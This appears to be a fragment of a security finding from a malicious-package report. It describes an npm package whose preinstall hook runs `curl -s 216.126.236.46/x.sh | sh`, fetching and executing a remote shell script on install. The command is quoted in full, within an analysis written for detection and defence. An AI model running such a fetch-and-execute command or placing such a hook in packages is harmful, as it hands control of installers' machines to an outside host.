  "summary": "preinstall hook fetches and executes remote shell script from bare IP over plain HTTP",
  "details": "package.json declares a preinstall lifecycle script that runs `curl -s 216.126.236.46/x.sh | sh`, fetching a shell script from a bare IPv4 address over plain HTTP and piping it into sh. This executes automatically on `npm install`, granting the operator of 216.126.236.46 arbitrary code execution on the installer's host with the privileges of the installing user. The shipped index.js is a 27-byte stub, so the manifest lifecycle hook is the entire functional payload of the package.",
